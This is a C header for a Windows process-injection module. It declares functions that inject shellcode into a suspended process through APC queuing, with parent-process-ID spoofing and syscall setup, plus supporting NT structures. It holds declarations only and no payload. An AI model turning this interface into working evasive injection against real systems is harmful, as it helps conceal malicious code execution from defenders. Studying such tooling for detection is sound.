/*
 * Process Injection Module
 * 
 * Implements APC (Asynchronous Procedure Call) injection with PPID spoofing.
 * Creates a process in suspended state, writes shellcode, and executes via APC queue.
 */

#ifndef INJECTION_H
#define INJECTION_H

#include <windows.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef _OBJECT_ATTRIBUTES_DEFINED
#define _OBJECT_ATTRIBUTES_DEFINED
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#endif

#ifndef _CLIENT_ID_DEFINED
#define _CLIENT_ID_DEFINED
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
#endif

// Results from injection operation
typedef struct _INJECTION_RESULT {
    BOOL success;
    DWORD processId;
    DWORD threadId;
    PVOID allocatedAddress;
    SIZE_T allocatedSize;
    CHAR targetProcess[MAX_PATH];
} INJECTION_RESULT, *PINJECTION_RESULT;

// Initialize syscalls for injection
BOOL InitializeInjectionSyscalls(void);

// Inject shellcode via APC
BOOL InjectShellcodeAPC(
    const char* targetProcess,
    BYTE* shellcode,
    SIZE_T shellcodeSize,
    PINJECTION_RESULT result
);

// Inject with PPID spoofing
BOOL InjectShellcodeAPCWithPPIDSpoof(
    const char* targetProcess,
    const char* parentProcess,
    BYTE* shellcode,
    SIZE_T shellcodeSize,
    PINJECTION_RESULT result
);

// Cleanup injection resources
VOID CleanupInjectionSyscalls(void);

VOID PrintInjectionResult(PINJECTION_RESULT result);

#endif // INJECTION_H
